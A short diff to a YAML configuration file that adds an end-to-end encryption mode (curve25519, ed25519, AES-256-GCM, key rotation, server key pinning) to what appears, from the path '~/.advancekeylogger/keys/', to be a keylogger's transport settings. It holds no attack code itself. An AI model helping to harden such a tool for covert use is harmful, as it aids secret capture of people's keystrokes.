@@ -70,8 +70,17 @@ transport:
 
 encryption:
   enabled: false
+  mode: "symmetric"         # "symmetric" (AES-256-CBC) or "e2e"
   algorithm: "AES-256-CBC"
   key: ""
+  e2e:
+    curve: "curve25519"
+    signing: "ed25519"
+    bulk_cipher: "aes-256-gcm"
+    key_rotation_hours: 24
+    key_store_path: "~/.advancekeylogger/keys/"
+    server_public_key: ""
+    pin_server_key: true
 
 compression:
   enabled: true
